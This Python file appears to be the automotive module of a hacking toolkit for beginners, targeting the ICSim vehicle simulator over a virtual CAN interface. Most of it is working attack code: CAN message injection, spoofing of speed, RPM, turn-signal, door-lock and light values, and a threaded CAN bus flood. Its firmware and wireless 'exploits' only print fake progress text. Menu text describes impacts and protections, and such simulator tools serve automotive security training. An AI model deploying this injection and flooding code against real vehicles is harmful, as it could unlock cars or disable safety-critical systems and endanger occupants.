#!/usr/bin/env python
import os
import time
import socket
import random
import can
import threading
import random

#Color codes
WHITE = '\033[37m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[31m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHTCYAN_EX = '\033[96m'
BLACK = '\x1b[30m'
RESET = '\033[0m'

#Configuration
ANIMATION_SPEED = 0.005

class AutomobileModule:
    def __init__(self):
        self.can_interface = "vcan0" 
        self.bus = None
        self.simulation_active = False
        self.hostname = self.get_hostname()
        self.setup_can_interface()   




    # ========= Text Animation ========= #
    def text_animation(self):
        banner_text = f"""{MAGENTA}
  _  _  _   _    __    ____  _  _  ____  ___  ____  ____  ____ {RED}
 ( \/ )( )_( )  /__\  (  _ \( \/ )( ___)/ __)(_  _)( ___)(  _ \\{MAGENTA}
  )  (  ) _ (  /(__)\  )   / \  /  )__) \__ \  )(   )__)  )   /{RED}
 (_/\_)(_) (_)(__)(__)(_)\_)  \/  (____)(___/ (__) (____)(_)\_)
        {RESET}"""

        for char in banner_text:
            print(char, end='', flush=True)
            time.sleep(ANIMATION_SPEED)
        print(f"\n{CYAN} >>> Extended Reconnaissance & Exploitation Toolkit For Newbies <<<{RESET}")
        print(f"{GREEN}| GitHub:{RESET}{YELLOW} @n3tworkh4x |{RESET}{MAGENTA} Ko-fi{YELLOW}(Donation):{RESET}{GREEN} https://ko-fi.com/n3twork |")
        print(f"\t\t{WHITE}Created by {GREEN}Network({RED}G{YELLOW}H{GREEN}A{BLACK}N{RED}A)\t\t\t")
        print(f"{RED} Use only for authorized security testing!{RESET}")

    def clear_screen(self) -> None:
        os.system('cls' if os.name == 'nt' else 'clear')

    def get_hostname(self) -> str:
        try:
            return socket.gethostname()
        except:
            return "unknown"



    # ========= CAN Bus Setup & Setdown Operations ========= #
    def setup_can_interface(self):
        """Set up CAN interface for simulation"""
        try:
            # Check if virtual CAN interface is available
            if os.system(f"ip link show {self.can_interface} > /dev/null 2>&1") != 0:
                print(f"\n{RED}  CAN interface {CYAN}{self.can_interface}{RED} not found!")
                time.sleep(1)
                print(f"{YELLOW}  Creating virtual CAN interface for ICSim...")
                time.sleep(3)
                os.system(f"sudo modprobe vcan && sudo ip link add dev {self.can_interface} type vcan && sudo ip link set up {self.can_interface}")
            
            # Initialize CAN bus
            self.bus = can.interface.Bus(channel=self.can_interface, bustype='socketcan')            
            print(f"{GREEN}  Connected to CAN interface:{CYAN} {self.can_interface}")
            time.sleep(3)
            return True
        except Exception as e:
            print(f"{RED}  Failed to setup CAN interface: {e}")
            print(f"{YELLOW}  Some features may not work without a proper CAN interface!")
            return False
        
    def setdown_can_interface(self):
        '''Set down CAN interface for simulation'''
        try:
            #Check if virtual CAN interface is available
            if os.system(f"ip link show {self.can_interface} > /dev/null 2>&1") == 0:
                print(f"\n{GREEN}  CAN interface {CYAN}{self.can_interface}{GREEN} found!")
                time.sleep(1)
                print(f"{YELLOW}  Deleting virtual CAN interface for ICSim...")
                time.sleep(3)
                print(f"{RED}  Disconnected from CAN interface:{CYAN} {self.can_interface}")
                time.sleep(3)
                os.system(f"sudo ip link del dev {self.can_interface} type vcan")
            
            return True
        except Exception:
            pass




    # ========== CAN Message Injection Attack ========= #
    def can_message_injection(self):
        """Simulate CAN message injection attack with ICSim-specific IDs"""
        print(f"{CYAN}  [{GREEN}+{CYAN}] Starting CAN Message Injection simulation for ICSim")
        
        # ICSim-specific CAN IDs
        can_ids = {
            "Speed": 0x244,
            "RPM": 0x201,
            "Turn Signals": 0x2C0,
            "Doors": 0x19B,
            "Lights": 0x2E0
        }
        
        print(f"\n{MAGENTA}  Available target systems for ICSim:{RESET}")
        for i, (system, can_id) in enumerate(can_ids.items()):
            print(f"{CYAN}  [{WHITE}{i}{CYAN}] {YELLOW}{system} {GREEN}({CYAN}ID: 0x{can_id:03X}{GREEN})")
        
        try:
            choice = int(input(f"\n{GREEN}  Select target system: {YELLOW}"))
            system = list(can_ids.keys())[choice]
            can_id = can_ids[system]
            
            # Create appropriate malicious data based on the system
            if system == "Speed":
                speed = int(input(f"{GREEN}  Enter speed value ({YELLOW}0-255{GREEN})({RED}default {GREEN}= {CYAN}0{GREEN}): {YELLOW}"))
                malicious_data = [0, 0, 0, speed, 150]
            elif system == "RPM":
                rpm = int(input(f"{GREEN}  Enter RPM value ({YELLOW}0-65535{GREEN})({RED}default {GREEN}= {CYAN}0{GREEN}): {YELLOW}"))
                malicious_data = [rpm >> 8, rpm & 0xFF, 0, 0, 0, 0, 0, 0]
            elif system == "Turn Signals":
                malicious_data = [random.randint(0, 3), 0, 0, 0, 0, 0, 0, 0]
            else:
                malicious_data = [random.randint(0, 255) for _ in range(8)]
            
            message = can.Message(arbitration_id=can_id, data=malicious_data, is_extended_id=False)
            
            if self.bus:
                active = 0
                num = int(input(f"{GREEN}  Enter the number of times for CAN packet({RED}default {GREEN}= {CYAN}5{GREEN}):{YELLOW} ") or "5")
                while active < num:
                    time.sleep(1)
                    self.bus.send(message)
                    print(f"{GREEN}  Injected malicious CAN message to {system} (ID: 0x{can_id:03X})")
                    print(f"{BLUE}  Data:{YELLOW} {[hex(x) for x in malicious_data]}\a")
                    active += 1
                    if active == num:
                        break                      
            else:
                print(f"{YELLOW}  Would inject: {system} - ID: 0x{can_id:03X}, Data: {malicious_data}")
                
        except (ValueError, IndexError):
            print(f"{RED}  Invalid selection!\a")
        except Exception as e:
            print(f"{RED}  Injection failed: {e}\a")



    # ========== ECU Firmware Attack ========= #
    def ecu_firmware_attack(self):
        """Simulate ECU firmware attack"""
        print(f"\n{CYAN}  [{GREEN}+{CYAN}] Starting ECU Firmware Attack...")
        
        # Simulate firmware extraction and modification
        print(f"{YELLOW}  Extracting current ECU firmware...")
        time.sleep(3)
        
        print(f"{YELLOW}  Analyzing firmware for vulnerabilities...")
        time.sleep(3)
        
        print(f"{RED}  Modifying firmware with malicious code...")
        time.sleep(3)
        
        print(f"{RED}  Flashing modified firmware back to ECU...")
        time.sleep(3)
        
        print(f"{GREEN}  ECU firmware compromised! Backdoor installed.")
        print(f"{RED}  Vehicle may behave unpredictably or be remotely controlled\a")



    # ========== Wireless Gateway Exploit Function ========= #
    def wireless_gateway_exploit(self):
        """Wireless gateway exploit"""
        print(f"\n{CYAN}  [{GREEN}+{CYAN}] Starting Wireless Gateway Exploit simulation")
        
        # Common automotive wireless attack vectors
        attack_vectors = [
            f"Bluetooth {GREEN}({CYAN}Keyless Entry{GREEN})",
            f"Wi-Fi {GREEN}({CYAN}Infotainment System{GREEN})",
            f"Cellular {GREEN}({CYAN}Telematics{GREEN})",
            f"TPMS {GREEN}({CYAN}Tire Pressure Monitoring System{GREEN})",
            f"RFID {GREEN}({CYAN}Immobilizer Bypass{GREEN})"
        ]
        
        print(f"\n{MAGENTA}  Available attack vectors")
        for i, vector in enumerate(attack_vectors):
            print(f"{CYAN}  [{WHITE}{i}{CYAN}]{YELLOW} {vector}")
        
        try:
            choice = int(input(f"\n{GREEN}  Select attack vector:{YELLOW} "))
            vector = attack_vectors[choice]
            
            print(f"{BLUE}  Scanning for {vector} vulnerabilities...")
            time.sleep(2)
            
            print(f"{YELLOW}  Exploiting {vector} weakness...")
            time.sleep(2)
            
            print(f"{GREEN}  Successfully compromised {vector}!")
            print(f"{GREEN}  Gained access to vehicle internal network\a")
            
        except (ValueError, IndexError):
            print(f"{RED}  Invalid selection!\a")




    # ========= Sensor Spoofing Fucntion & It Helper Function ========= #
    def sensor_spoofing(self):
        """Simulate sensor spoofing attack with vehicle integration"""
        print(f"\n{CYAN}  [{GREEN}+{CYAN}] Starting Sensor Spoofing for ICSim")
    
        # Dictionary mapping sensor names to their CAN ID and a spoofing function
        sensors = {
            "Speed Sensor": {
                "id": 0x244,
                "spoof_func": self._spoof_speed
            },
            "RPM Sensor": {
                "id": 0x201,
                "spoof_func": self._spoof_rpm
            },
            "Turn Signal Sensor": {
                "id": 0x2C0,
                "spoof_func": self._spoof_turn_signal
            },
            "Door Sensor": {
                "id": 0x19B,
                "spoof_func": self._spoof_doors
            },
            "Light Sensor": {
                "id": 0x2E0,
                "spoof_func": self._spoof_lights
            }
        }
        
        print(f"\n{MAGENTA}  Available sensors to spoof for ICSim")
        sensor_list = list(sensors.keys())
        for i, sensor in enumerate(sensor_list):
            print(f"  {CYAN}[{WHITE}{i}{CYAN}] {YELLOW}{sensor} {GREEN}({CYAN}ID: 0x{sensors[sensor]['id']:03X}{GREEN})")
    
        try:
            choice = int(input(f"\n{GREEN}  Select {YELLOW}sensor{GREEN} to spoof: {YELLOW}"))
            sensor_name = sensor_list[choice]
            sensor_info = sensors[sensor_name]
            
            can_id = sensor_info['id']
            
            print(f"\n{BLUE}  Intercepting {sensor_name} data...")
            time.sleep(1)
    
            #Call the specific spoofing function for this sensor
            spoofed_data = sensor_info['spoof_func']()
            
            if spoofed_data is None:
                print(f"{RED}  Spoofing cancelled or failed.")
                return
    
            print(f"\n{BLUE}  Generating spoofed {MAGENTA}{sensor_name}{BLUE} values...")
            time.sleep(1)
    
            #Send the spoofed data
            if self.bus:
                message = can.Message(arbitration_id=can_id, data=spoofed_data, is_extended_id=False)
                self.bus.send(message)
                print(f"{GREEN}  Injecting false {YELLOW}{sensor_name}{YELLOW} data...")
                print(f"{BLUE}  CAN ID: {YELLOW}0x{can_id:03X}{BLUE}, Data: {YELLOW}{[hex(x) for x in spoofed_data]}")
            else:
                print(f"{BLUE}  Would inject: {YELLOW}{sensor_name}{BLUE} - ID: {YELLOW}0x{can_id:03X}{BLUE}, Data:{YELLOW} {spoofed_data}")
            
            time.sleep(1)
            print(f"{GREEN}  {MAGENTA}{sensor_name}{GREEN} spoofing successful!")
            print(f"{YELLOW}  ICSim dashboard should now show the spoofed value.\a")
    
        except (ValueError, IndexError):
            print(f"{RED}  Invalid selection!\a")
        except Exception as e:
            print(f"{RED}  Spoofing failed: {e}\a")
    
    # --- Helper Functions For Each Sensor Type --- #
    def _spoof_speed(self):
        """Spoof the vehicle speed sensor (ICSim ID 0x244)"""
        try:
            speed = int(input(f"{GREEN}  Enter speed value ({YELLOW}0-255 {MAGENTA}km/h{GREEN})({RED}default {GREEN}= {CYAN}0{GREEN}): {YELLOW}") or "0")
            speed = max(0, min(255, speed))  #Clamp value
            return [0x00, 0x00, 0x00, speed, 150]
        except ValueError:
            print(f"\n{RED}  Invalid speed value!\a")
            return None
    
    def _spoof_rpm(self):
        """Spoof the engine RPM sensor (ICSim ID 0x201)"""
        try:
            rpm = int(input(f"{GREEN}  Enter RPM value ({YELLOW}0-8000{GREEN})({RED}default {GREEN}= {CYAN}0{GREEN}): {YELLOW}") or "0")
            rpm = max(0, min(8000, rpm))  #Clamp value
            byte1 = (rpm >> 8) & 0xFF  # High byte
            byte2 = rpm & 0xFF         # Low byte
            return [byte1, byte2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
        except ValueError:
            print(f"\n{RED}  Invalid RPM value!\a")
            return None
    
    def _spoof_turn_signal(self):
        """Spoof the turn signal sensor (ICSim ID 0x2C0)"""
        print(f"{GREEN}  Select turn signal state")
        print(f"  {GREEN}[{WHITE}0{GREEN}]{MAGENTA} Off")
        print(f"  {GREEN}[{WHITE}1{GREEN}]{MAGENTA} Left")
        print(f"  {GREEN}[{WHITE}2{GREEN}]{MAGENTA} Right")
        print(f"  {GREEN}[{WHITE}3{GREEN}]{MAGENTA} Hazard (Both)")
        
        try:
            choice = int(input(f"{GREEN}  Selection({RED}default {GREEN}= {CYAN}0{GREEN}): {YELLOW}") or "0")
            states = {0: 0x00, 1: 0x01, 2: 0x02, 3: 0x03}
            state_byte = states.get(choice, 0x00)
            return [state_byte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
        except ValueError:
            print(f"\n{RED}  Invalid selection!\a")
            return None
    
    def _spoof_doors(self):
        """Spoof the door lock sensor (ICSim ID 0x19B)"""
        print(f"{GREEN}  Select door state")
        print(f"{GREEN}  [{WHITE}0{GREEN}]{MAGENTA} Locked")
        print(f"{GREEN}  [{WHITE}1{GREEN}]{MAGENTA} Unlocked")
        
        try:
            choice = int(input(f"{GREEN}  Selection({RED}default {GREEN}= {CYAN}0{GREEN}): {YELLOW}") or "0")
            state_byte = 0x0F if choice == 0 else 0x00
            return [0x00, 0x00, state_byte, 0x00, 0x00, 0x00]
        except ValueError:
            print(f"\n{RED}  Invalid selection!\a")
            return None
    
    def _spoof_lights(self):
        """Spoof the light sensor (ICSim ID 0x2E0)"""
        print(f"{GREEN}  Select light state")
        print(f"{GREEN}  [{WHITE}0{GREEN}] {MAGENTA}Off")
        print(f"{GREEN}  [{WHITE}1{GREEN}] {MAGENTA}On")
        
        try:
            choice = int(input(f"{GREEN}  Selection({RED}default {GREEN}= {CYAN}0{GREEN}):{YELLOW} ") or "0")
            state_byte = 0x01 if choice == 1 else 0x00
            return [state_byte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
        except ValueError:
            print(f"\n{RED}  Invalid selection!\a")
            return None
        


    # ========= Can Bus Flood Function ========= #
    def can_bus_flood(self):
        """Simulate CAN bus flooding attack with vehicle-specific IDs"""
        print(f"\n{CYAN}  [{GREEN}+{CYAN}] Starting CAN Bus Flood")
        
        try:
            duration = int(input(f"{GREEN}  Flood duration ({YELLOW}seconds{GREEN}) [{RED}default {GREEN}= {CYAN}5{GREEN}]: {YELLOW}") or "5")
            priority = input(f"{CYAN}  Message priority [{RED}high{GREEN}/{YELLOW}medium{GREEN}/low, {MAGENTA}default:{RED} high{GREEN}]: {YELLOW}") or "high"
            
            print(f"\n{CYAN}  [{RED}ℹ{CYAN}] Flooding CAN bus with {MAGENTA}{priority}{CYAN} priority messages for {MAGENTA}{duration}{CYAN} seconds...")
            
            # Determine message rate based on priority
            rates = {"high": 1000, "medium": 100, "low": 10}
            rate = rates.get(priority.lower(), 100)
            
            #vehicle-specific CAN IDs to target
            icsim_ids = [0x244, 0x201, 0x2C0, 0x2D0, 0x2E0, 0x19B]
            
            #Start flooding simulation
            self.simulation_active = True
            start_time = time.time()
            
            def flood_messages():
                msg_count = 0
                while self.simulation_active and (time.time() - start_time) < duration:
                    if self.bus:
                        #Send random CAN messages targeting vehicle IDs
                        can_id = random.choice(icsim_ids)
                        data = [random.randint(0, 255) for _ in range(random.randint(1, 8))]
                        message = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
                        try:
                            self.bus.send(message)
                        except can.CanError:
                            print(f"{RED}  CAN bus error - flooding may be too intense")
                            break
                    msg_count += 1
                    time.sleep(1/rate)
                
                return msg_count
            
            #Run flooding in a separate thread
            flood_thread = threading.Thread(target=flood_messages)
            flood_thread.start()
            
            #Show progress
            for i in range(duration):
                if not self.simulation_active:
                    break
                print(f"{YELLOW}  Flooding... {RED}{i+1}/{GREEN}{duration} {YELLOW}seconds", end="\r")
                time.sleep(1)
            
            self.simulation_active = False
            flood_thread.join()
            
            print(f"{CYAN}  [{GREEN}+{CYAN}]{GREEN} CAN bus flood completed!")
            print(f"{YELLOW}  Vehicle may become unresponsive or display erratic behavior!\a")
            
        except ValueError:
            print(f"{CYAN}  [{RED}-{CYAN}]{RED} Invalid input")
        except Exception as e:
            print(f"{RED}  Flooding failed: {e}")
            self.simulation_active = False



    # ========= Real Time Monitor On The Vehicles CAN Network Function ========= #
    def real_time_monitor(self):
        """Real-time CAN bus monitoring for vehicle"""
        print(f"\n{CYAN}  [{GREEN}+{CYAN}] Starting Real-time CAN Bus Monitoring for vehicle")
        
        if not self.bus:
            if not self.setup_can_interface():
                print(f"\n{CYAN}  [{RED}-{CYAN}]{RED} Cannot monitor without CAN interface")
                return
        
        try:
            duration = int(input(f"{GREEN}  Monitoring duration ({YELLOW}seconds{GREEN}) [{YELLOW}0{GREEN} for continuous]:{YELLOW} ") or "0")
            filter_ids = input(f"{GREEN}  Filter by CAN IDs [{YELLOW}0x244/0x19B{GREEN}]{GREEN} ({YELLOW}comma-separated, leave empty for all{GREEN}):{YELLOW} ")
            
            #Parse filter IDs
            filter_list = []
            if filter_ids:
                try:
                    filter_list = [int(id_str.strip(), 16) if id_str.strip().startswith('0x') 
                                  else int(id_str.strip()) for id_str in filter_ids.split(',')]
                except ValueError:
                    print(f"{CYAN}  [{RED}-{CYAN}] {RED}Invalid CAN ID format")
                    return
            
            print(f"{CYAN}  [{RED}ℹ{CYAN}]{RED} Starting monitor... Press Ctrl+C to stop")
            print(f"{CYAN}    Delta  {f'{YELLOW} |{CYAN}':6} CANID{f'{YELLOW} |{CYAN}':6}   Data")
            print(f"  {YELLOW}{'-'*36}{RESET}")
            
            start_time = time.time()
            message_count = 0
            
            #Set up a notifier to read messages
            try:
                prev_timestamp = None
                prev_data = None
                while (duration == 0) or (time.time() - start_time < duration):
                    time.sleep(0.08)
                    msg = self.bus.recv()
                    if msg:
                        if not filter_list or msg.arbitration_id in filter_list:
                            message_count += 1

                            current_timestamp = msg.timestamp
                            if prev_timestamp is None:
                                delta_ms = 0
                            else:
                                delta_ms = (current_timestamp - prev_timestamp) * 1000

                            prev_timestamp = current_timestamp

                            can_id = f"{msg.arbitration_id:03X}"

                            # Highlight changed bytes in yellow, unchanged in default (e.g. cyan)
                            data_display = []
                            for i, byte in enumerate(msg.data):
                                byte_hex = f"{byte:02X}"
                                if prev_data and i < len(prev_data) and byte == prev_data[i]:
                                    # Unchanged byte
                                    data_display.append(f"{CYAN}{byte_hex}")
                                else:
                                    # Changed byte
                                    data_display.append(f"{RED}{byte_hex}")
                            data_hex = ' '.join(data_display)

                            prev_data = msg.data

                            print(f"{CYAN}{delta_ms:7.3f}{YELLOW}     |  {CYAN}{can_id:03}{YELLOW}  | {data_hex}")

            except KeyboardInterrupt as err:
                print(f"{RED}{err} Monitoring stopped by user")
            
            print(f"{CYAN}  [{GREEN}+{CYAN}] Monitoring completed. Captured {YELLOW}{message_count}{CYAN} messages.\a")
            
        except Exception as e:
            print(f"{RED}  Monitoring failed: {e}")



    # ========= Main Loop For Xharvester Automobile ========= #
    def main(self) -> None:
        time.sleep(0.05)
        active = True
        while active:
            self.clear_screen()
            self.text_animation()
            print(f"\n\t\t{LIGHTCYAN_EX} ︻芫═─── {RED}💥 {YELLOW}(▀̿Ĺ̯▀̿ ̿)\t\t\t\n")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{GREEN}         {LIGHTCYAN_EX}🚀{GREEN}   XHARVESTER {YELLOW}-{CYAN} AUTOMOBILE MENU   {LIGHTCYAN_EX}🕷{GREEN}")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{CYAN}\t[{WHITE}1{CYAN}]{MAGENTA} 💉{CYAN} CAN Message Injection")
            print(f"{CYAN}\t[{WHITE}2{CYAN}]{MAGENTA} 💾{CYAN} ECU Firmware Attack")
            print(f"{CYAN}\t[{WHITE}3{CYAN}]{MAGENTA} 📶{CYAN} Wireless Gateway Exploit")
            print(f"{CYAN}\t[{WHITE}4{CYAN}]{MAGENTA} 📡{CYAN} Sensor Spoofing")
            print(f"{CYAN}\t[{WHITE}5{CYAN}]{MAGENTA} 🚫{CYAN} CAN Bus Flood")
            print(f"{CYAN}\t[{WHITE}6{CYAN}]{MAGENTA} 👁️{CYAN}  Real-time CAN Monitor")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
            print(f"{CYAN}\t[{YELLOW}0{CYAN}]{YELLOW} 🚪🔙 Back")
            print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")

            try:
                choice = input(f"\n  {CYAN}[{MAGENTA}💀{CYAN}] {GREEN}xharvester{YELLOW}@{RESET}{CYAN}{self.hostname}{RESET}{RED}:{RESET}{GREEN}~{RESET}{YELLOW}$ ")
                    
                if choice == "0":
                    mesg = f"{MAGENTA}\n\t\t\t🚪🔙{YELLOW} Returning to menu...\n\n"
                    for word in mesg:
                        print(word, end="", flush=True)
                        time.sleep(0.05)
                        self.setdown_can_interface()
                    active = False

                elif choice == "1":
                    print(f"\n{GREEN}  CAN Message Injection:{CYAN} Attacker injects malicious commands onto the vehicle's internal network via OBD-II PORT.")
                    print(f"{GREEN}  Impact:{CYAN} Can lead to unauthorized control of critical systems like brakes or steering.")
                    print(f"{GREEN}  Protection:{CYAN} Implement message authentication (e.g., SecOC) and network segmentation.{RESET}")
                    self.can_message_injection()

                elif choice == "2":
                    print(f"\n{GREEN}  ECU Firmware Attack:{CYAN} Flashing malicious software onto a vehicle's electronic control units.")
                    print(f"{GREEN}  Impact:{CYAN} Permanently alters vehicle behavior, disables safety features, or bricks the ECU.")
                    print(f"{GREEN}  Protection:{CYAN} Use secure boot processes and cryptographically signed firmware updates.{RESET}")
                    self.ecu_firmware_attack()

                elif choice == "3":
                    print(f"\n{GREEN}  Wireless Gateway Exploit:{CYAN} Attacking via Bluetooth, Wi-Fi, or cellular to access internal networks.")
                    print(f"{GREEN}  Impact:{CYAN} Provides a remote entry point to steal data or send commands to critical systems.")
                    print(f"{GREEN}  Protection:{CYAN} Harden external interfaces, use firewalls, and employ secure protocols (TLS).{RESET}")
                    self.wireless_gateway_exploit()

                elif choice == "4":
                    print(f"\n{GREEN}  Sensor Spoofing:{CYAN} Sending falsified data from spoofed sensors (e.g., GPS, wheel speed).")
                    print(f"{GREEN}  Impact:{CYAN} Misleads autonomous systems, causing incorrect navigation or unsafe maneuvers.")
                    print(f"{GREEN}  Protection:{CYAN} Implement sensor data validation and anomaly-based intrusion detection systems.{RESET}")
                    self.sensor_spoofing()

                elif choice == "5":
                    print(f"\n{GREEN}  CAN Bus Flood:{CYAN} Flooding the network with high-priority messages to block communication.")
                    print(f"{GREEN}  Impact:{CYAN} Renders safety-critical systems unresponsive, potentially immobilizing the vehicle.")
                    print(f"{GREEN}  Protection:{CYAN} Deploy intrusion detection systems (IDS) to monitor for anomalous message rates.{RESET}")
                    self.can_bus_flood()

                elif choice == "6":
                    print(f"\n{GREEN}  Real-time CAN Monitor:{CYAN} Monitor CAN bus traffic in real-time.")
                    print(f"{GREEN}  Purpose:{CYAN} Observe normal vehicle communication and detect anomalies.")
                    print(f"{GREEN}  Usage:{CYAN} Essential for understanding vehicle network behavior.{RESET}")
                    self.real_time_monitor()

                else:
                    error = f"\n\t\t\t{YELLOW}{choice} is not a valid option!\n"
                    for word in error:
                        print(word, end="", flush=True)
                        time.sleep(0.05)

                if choice != "0":
                    input(f"\n  {GREEN}Press Enter to continue...")
            
            except (KeyboardInterrupt, EOFError):
                terminator = f"\n\n\t\t\t{MAGENTA}🚪🔙{YELLOW} Returning to menu...\n\n"
                for char in terminator:
                    print(char, end="", flush=True)
                    time.sleep(0.05)
                    self.setdown_can_interface()
                active = False

if __name__ == "__main__":
    try:
        auto = AutomobileModule()
        auto.main()
    except Exception as err:
        pass